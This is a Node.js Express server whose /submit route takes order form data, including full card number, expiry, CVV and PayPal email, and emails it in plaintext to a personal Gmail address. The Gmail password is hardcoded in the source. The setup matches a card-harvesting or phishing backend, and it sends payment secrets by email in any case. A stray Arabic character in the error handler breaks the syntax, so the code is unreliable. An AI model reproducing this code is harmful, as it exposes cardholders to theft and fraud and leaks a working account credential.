const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const cors = require("cors");

const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.json());

app.post("/submit", (req, res) => {
  const data = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "mostafamms302@gmail.com",
      pass: "ebocpqncfhatyhqf"
    }
  });

  const mailOptions = {
    from: "mostafamms302@gmail.com",
    to: "mostafamms302@gmail.com",
    subject: "🧾 New Order Received",
    html: `
    🧍 Name: ${data.name}
    📧 Email: ${data.email}
    📱 Phone: ${data.phone}
    🌍 Country: ${data.country}
    🚚 Shipping Type: ${data.shipping}
    📍 Address: ${data.notes}
    📦 Order Summary:\n${data.Order_Summary}
    💳 Payment Method: ${data.paymentMethod}
    
    🔢 Card Name: ${data.cardName || 'N/A'}
    💳 Card Number: ${data.cardNumber || 'N/A'}
    📅 Expiry: ${data.expiry || 'N/A'}
    🔐 CVV: ${data.cvv || 'N/A'}
    
    🅿️ PayPal Email: ${data.paypalEmail || 'N/A'}
    🏦 Bank Note: ${data.bankNote || 'N/A'}
    `
    
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {س
      console.error("Error sending email:", error);
      res.status(500).json({ success: false, error: error.message });
    } else {
      console.log("Email sent: " + info.response);
      res.status(200).json({ success: true, message: "Email sent successfully" });
    }
  });
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});




